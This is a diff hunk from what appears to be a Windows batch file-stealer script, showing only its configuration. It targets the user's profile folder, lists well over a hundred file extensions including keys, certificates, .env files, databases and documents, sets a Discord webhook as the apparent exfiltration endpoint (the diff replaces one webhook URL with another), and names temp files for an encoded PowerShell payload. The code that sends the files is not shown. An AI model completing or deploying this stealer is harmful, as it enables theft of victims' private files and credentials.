@@ -5,7 +5,7 @@ setlocal enabledelayedexpansion
 set "version=1.0.0"
 set "TARGET_DIR=%USERPROFILE%"
 set "EXTENTIONS=.lnk,.dll,.js,.jar,.py,.sh,.php,.html,.htm,.css,.txt,.docx,.xlsx,.pptx,.pdf,.zip,.rar,.7z,.tar,.gz,.iso,.img,.dmg,.msi,.apk,.ipa,.sys,.bin,.dat,.log,.msp,.msu,.cab,.inf,.reg,.xml,.json,.yaml,.yml,.csv,.tsv,.md,.rtf,.odt,.odp,.ods,.odg,.odf,.c,.cpp,.cs,.swift,.rb,.go,.ts,.lua,.pl,.r,.scala,.ini,.toml,.properties,.env,.sql,.db,.sqlite,.sqlite3,.pkl,.pickle,.h5,.hdf5,.parquet,.sav,.dta,.por,.mp3,.wav,.flac,.ogg,.m4a,.aac,.mp4,.mkv,.avi,.mov,.webm,.flv,.jpg,.jpeg,.png,.gif,.bmp,.tiff,.webp,.svg,.ico,.vmdk,.vdi,.vhd,.vhdx,.ova,.ovf,.dockerfile,.whl,.egg,.epub,.mobi,.tex,.as,.fla,.swf,.blend,.3ds,.obj,.fbx,.stl,.dwg,.dxf,.psd,.ai,.indd,.xcf,.sketch,.fig,.xd,.ttf,.otf,.woff,.woff2,.bak,.tmp,.part,.crdownload,.torrent,.cue,.nfo,.sfv,.sig,.pem,.crt,.cer,.key,.asc,.gpg,.ics,.vcf,.lst,.map,.log1,.log2,.dmp,.core,.ram,.m3u,.pls,.asx,.srt,.sub,.idx,.bup,.ifo,.vob,.rm,.ts,.hex,.elf"
-set "WEBHOOK=https://discord.com/api/webhooks/1245309165371654205/HJndj2bB5UPs5z943clvBQUWU6Iw7aLB8lYuraalavaMtXqyFF-j_JK77m90XY5wXp2D"
+set "WEBHOOK=https://discord.com/api/webhooks/8239058394058930485/njhkrehguioreugio7584397859340768934jgfi9304"
 set "TMP_B64=%TEMP%\_enc_payload.b64"
 set "TMP_PS1=%TEMP%\_enc_payload.ps1"
 set "ID=%random%%random%%random%%random%%random%%random%"
